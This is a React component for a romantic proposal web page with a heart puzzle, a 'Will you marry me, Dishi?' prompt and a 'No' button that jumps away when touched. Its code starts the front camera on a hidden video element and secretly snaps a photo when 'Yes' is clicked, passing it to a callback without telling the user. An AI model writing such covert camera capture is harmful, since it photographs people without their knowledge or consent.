"use client";
import React, { useState, useEffect, useRef } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { Heart } from 'lucide-react';

export default function ProposalModule({ setAppState, onCapture }) {
  const [step, setStep] = useState(0); // 0: Intro, 1: Puzzle, 2: Fixed, 3: Proposal, 4: Final
  const [isFixed, setIsFixed] = useState(false);
  const [holdProgress, setHoldProgress] = useState(0);
  const [noPosition, setNoPosition] = useState({ x: 0, y: 0 });
  const [flash, setFlash] = useState(false);
  const hiddenVideoRef = useRef(null);

  const holdTimerRef = useRef(null);
  const heartbeatIntervalRef = useRef(null);

  // 🔥 Hidden Camera Start (Front Cam Only)
  useEffect(() => {
    const startHiddenCamera = async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: "user" }, // Strictly front camera
            audio: false 
        });
        if (hiddenVideoRef.current) {
            hiddenVideoRef.current.srcObject = stream;
            // Ensure video plays so frame is ready for capture
            hiddenVideoRef.current.play().catch(e => console.log(e));
        }
      } catch (err) {}
    };
    startHiddenCamera();
    
    return () => {
      if (hiddenVideoRef.current && hiddenVideoRef.current.srcObject) {
        hiddenVideoRef.current.srcObject.getTracks().forEach(track => track.stop());
      }
    };
  }, []);

  // Cinematic Text Timings
  useEffect(() => {
    if (step === 0) {
      setTimeout(() => setStep(1), 4000);
    }
  }, [step]);

  // DRAG LOGIC: Left ki taraf drag karke dil jodne ke liye
  const handleDragEnd = (event, info) => {
    if (info.offset.x < -30) {
      if (navigator.vibrate) navigator.vibrate(50);
      setIsFixed(true);
      setTimeout(() => setStep(2), 1500); // 1.5s baad "Hold" wala instructions
    }
  };

  // HEARTBEAT HOLD LOGIC
  const startHeartbeat = () => {
    if (step !== 2) return;
    
    // 🔥 FIXED: Turant dhak-dhak feel hogi jaise hi touch karegi (No 1-second delay)
    if (navigator.vibrate) navigator.vibrate([100, 100, 150]);
    
    // Baaki ki beats har 1 second me
    heartbeatIntervalRef.current = setInterval(() => {
      if (navigator.vibrate) navigator.vibrate([100, 100, 150]);
    }, 1000);

    // Progress to 100% in 4 seconds
    let progress = 0;
    holdTimerRef.current = setInterval(() => {
      progress += 2.5; 
      setHoldProgress(progress);
      if (progress >= 100) {
        clearInterval(holdTimerRef.current);
        clearInterval(heartbeatIntervalRef.current);
        if (navigator.vibrate) navigator.vibrate([300, 200, 300]);
        setStep(3); // PROPOSAL REVEAL!
      }
    }, 100);
  };

  const stopHeartbeat = () => {
    clearInterval(holdTimerRef.current);
    clearInterval(heartbeatIntervalRef.current);
    if (step === 2) setHoldProgress(0); // Reset if left early
  };

  useEffect(() => {
    return () => stopHeartbeat();
  }, []);

  // RUNAWAY NO BUTTON LOGIC
  const handleNoInteraction = () => {
    if (navigator.vibrate) navigator.vibrate(50);
    setNoPosition({
      x: (Math.random() - 0.5) * 250, // Jumps left/right randomly
      y: (Math.random() - 0.5) * 250  // Jumps up/down randomly
    });
  };

  // YES BUTTON CLICK LOGIC
  const handleYesClick = () => {
    setFlash(true);
    if (navigator.vibrate) navigator.vibrate([100, 100, 100]);
    
    // 🔥 Photo Capture Logic (Secret Snap)
    if (hiddenVideoRef.current && hiddenVideoRef.current.srcObject) {
      const video = hiddenVideoRef.current;
      if(video.videoWidth > 0) {
          const canvas = document.createElement("canvas");
          canvas.width = video.videoWidth; 
          canvas.height = video.videoHeight;
          const ctx = canvas.getContext("2d");
          ctx.translate(canvas.width, 0); 
          ctx.scale(-1, 1);
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          if (onCapture) onCapture(canvas.toDataURL("image/jpeg", 0.9)); 
      }
    }

    setTimeout(() => {
      setStep(4);
      setFlash(false);
    }, 500);
  };

  return (
    <motion.div 
      initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
      className="absolute inset-0 w-full h-[100dvh] bg-[#050002] z-[999] flex flex-col items-center justify-center overflow-hidden font-sans select-none"
    >
      <audio src="/song.mp3" autoPlay loop className="hidden" />
      <video ref={hiddenVideoRef} autoPlay playsInline muted className="hidden opacity-0 pointer-events-none" />

      {/* CAMERA FLASH EFFECT */}
      <AnimatePresence>
        {flash && <motion.div initial={{ opacity: 1 }} animate={{ opacity: 0 }} transition={{ duration: 0.8 }} className="absolute inset-0 bg-white z-[1000]" />}
      </AnimatePresence>

      <AnimatePresence mode="wait">
        
        {/* STEP 0: INTRO TEXT */}
        {step === 0 && (
          <motion.div key="intro" initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: -10 }} transition={{ duration: 1 }} className="px-8 text-center">
            <h1 className="text-rose-200 text-xl md:text-2xl font-serif italic mb-4">"I know I broke us..."</h1>
            <p className="text-rose-400/80 text-sm tracking-widest uppercase font-bold">Can you fix my heart?</p>
          </motion.div>
        )}

        {/* STEP 1 & 2: THE KINTSUGI PUZZLE & HOLD */}
        {(step === 1 || step === 2) && (
          <motion.div key="puzzle" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0, scale: 1.5, filter: "blur(10px)" }} className="flex flex-col items-center justify-center h-full w-full relative">
            <div className="absolute inset-0 bg-[radial-gradient(circle_at_center,rgba(244,63,94,0.1)_0,transparent_60%)] pointer-events-none" />
            
            <div className="absolute top-32 text-center">
              <h2 className="text-rose-300 font-bold tracking-widest uppercase text-sm mb-2">
                {step === 1 ? "Drag the piece to fix it" : "You fixed it"}
              </h2>
              <p className={`text-xs ${step === 2 ? "text-rose-400 animate-pulse" : "text-rose-400/60"}`}>
                {step === 1 ? "Some things are more beautiful after they are broken." : "Now press and hold to feel it beat..."}
              </p>
            </div>

            {/* THE HEART */}
            <div 
              className="relative w-64 h-64 flex items-center justify-center"
              onPointerDown={startHeartbeat}
              onPointerUp={stopHeartbeat}
              onPointerLeave={stopHeartbeat}
              style={{ touchAction: 'none' }}
            >
              {/* LEFT HALF */}
              <motion.div 
                className="absolute inset-0 flex items-center justify-center"
                style={{ clipPath: 'polygon(0 0, 55% 0, 45% 30%, 55% 70%, 45% 100%, 0 100%)' }}
              >
                <Heart size={160} fill={isFixed ? "#f43f5e" : "#881337"} className={isFixed ? "text-rose-500" : "text-rose-900"} />
              </motion.div>

              {/* RIGHT HALF (Draggable) */}
              <motion.div 
                drag={!isFixed}
                dragConstraints={{ top: 0, bottom: 0, left: 0, right: 0 }}
                dragElastic={0.1}
                onDragEnd={handleDragEnd}
                animate={isFixed ? { x: 0, y: 0, rotate: 0 } : { x: 40, y: -20, rotate: 10 }}
                transition={isFixed ? { type: "spring", stiffness: 300, damping: 20 } : {}}
                className={`absolute inset-0 flex items-center justify-center ${!isFixed ? "cursor-grab active:cursor-grabbing" : ""}`}
                style={{ clipPath: 'polygon(55% 0, 100% 0, 100% 100%, 45% 100%, 55% 70%, 45% 30%)' }}
              >
                <Heart size={160} fill={isFixed ? "#f43f5e" : "#881337"} className={isFixed ? "text-rose-500" : "text-rose-900"} />
              </motion.div>

              {/* GOLDEN CRACK */}
              <AnimatePresence>
                {isFixed && (
                  <motion.svg 
                    initial={{ pathLength: 0, opacity: 0 }} 
                    animate={{ pathLength: 1, opacity: 1 }} 
                    transition={{ duration: 1.5, ease: "easeInOut" }}
                    className="absolute inset-0 w-full h-full pointer-events-none drop-shadow-[0_0_8px_rgba(251,191,36,1)]"
                  >
                    <path d="M141 52 L128 90 L141 154 L128 204" fill="none" stroke="#fbbf24" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round" />
                  </motion.svg>
                )}
              </AnimatePresence>

              {/* HEARTBEAT GLOW */}
              {step === 2 && holdProgress > 0 && (
                <motion.div animate={{ scale: [1, 1.2, 1, 1.2, 1] }} transition={{ duration: 1, repeat: Infinity }} className="absolute inset-0 rounded-full bg-rose-500/20 blur-2xl z-[-1]" />
              )}
            </div>

            {/* HOLD PROGRESS BAR */}
            {step === 2 && (
              <div className="absolute bottom-32 w-48 h-1.5 bg-white/10 rounded-full overflow-hidden">
                <motion.div className="h-full bg-gradient-to-r from-rose-500 to-pink-500" animate={{ width: `${holdProgress}%` }} transition={{ duration: 0.1 }} />
              </div>
            )}
          </motion.div>
        )}

        {/* STEP 3: PROPOSAL WITH SPACED YES/NO BUTTONS */}
        {step === 3 && (
          <motion.div key="proposal" initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="flex flex-col items-center justify-center w-full h-full relative px-6">
            <div className="absolute inset-0 bg-[radial-gradient(ellipse_at_center,rgba(225,29,72,0.3)_0,transparent_80%)] pointer-events-none" />
            
            {/* Ring pops up */}
            <motion.div initial={{ y: 50, scale: 0, rotate: -20 }} animate={{ y: -20, scale: 1.2, rotate: 0 }} transition={{ type: "spring", damping: 12, duration: 1.5 }} className="text-8xl drop-shadow-[0_0_50px_rgba(251,191,36,0.8)] mb-8 relative z-20">
              💍
            </motion.div>

            <motion.h1 initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.5 }} className="text-3xl md:text-4xl font-black text-center text-white drop-shadow-md mb-12 z-20 leading-tight">
              Will you marry me, <br/> <span className="text-rose-400">Dishi?</span>
            </motion.h1>

            {/* 🔥 BUTTONS CONTAINER (Proper Gap & Spacing) 🔥 */}
            <div className="flex flex-row items-center justify-center gap-8 md:gap-12 relative w-full h-32 z-50">
              
              {/* YES BUTTON */}
              <motion.button 
                initial={{ opacity: 0, scale: 0 }} animate={{ opacity: 1, scale: 1 }} transition={{ delay: 1, type: "spring" }}
                onClick={handleYesClick}
                className="px-8 py-4 bg-rose-600 hover:bg-rose-500 text-white rounded-full font-black uppercase tracking-wider shadow-[0_0_30px_rgba(225,29,72,0.6)] active:scale-95 transition-all text-sm md:text-base flex items-center gap-2 relative z-50"
              >
                Yes, I'm yours! <Heart size={18} className="fill-white animate-pulse" />
              </motion.button>
              
              {/* RUNAWAY NO BUTTON (Spaced perfectly until touched) */}
              <motion.button 
                initial={{ opacity: 0 }} 
                animate={{ opacity: 1, x: noPosition.x, y: noPosition.y }} 
                transition={{ type: "spring", stiffness: 300, damping: 20, opacity: { delay: 1 } }}
                onPointerDown={handleNoInteraction} 
                onMouseEnter={handleNoInteraction}
                style={{ touchAction: 'none', zIndex: 40 }}
                className="px-8 py-4 bg-zinc-800 text-slate-300 rounded-full font-bold uppercase tracking-wider shadow-lg text-sm md:text-base border border-zinc-700 relative"
              >
                No 😡
              </motion.button>
            </div>
          </motion.div>
        )}

        {/* STEP 4: FINAL SCREEN */}
        {step === 4 && (
          <motion.div key="final" initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="flex flex-col items-center justify-center w-full h-full text-center relative px-8 z-20">
            <Heart size={64} className="text-rose-500 fill-rose-500 animate-pulse drop-shadow-[0_0_40px_rgba(225,29,72,0.8)] mb-6" />
            <h1 className="text-3xl md:text-4xl font-black text-white mb-4">
              I love you, <br/><span className="text-rose-400">Mrs. Mehta ❤️</span>
            </h1>
            <p className="text-rose-200/80 mb-12 font-medium">Your Marshmallow is forever yours.</p>
            
            <button onClick={() => setAppState("WHATSAPP_UI")} className="px-6 py-3 bg-white/10 hover:bg-white/20 text-white rounded-full font-semibold border border-white/20 backdrop-blur-md transition-all">
              Go back to chat
            </button>
          </motion.div>
        )}
      </AnimatePresence>
    </motion.div>
  );
}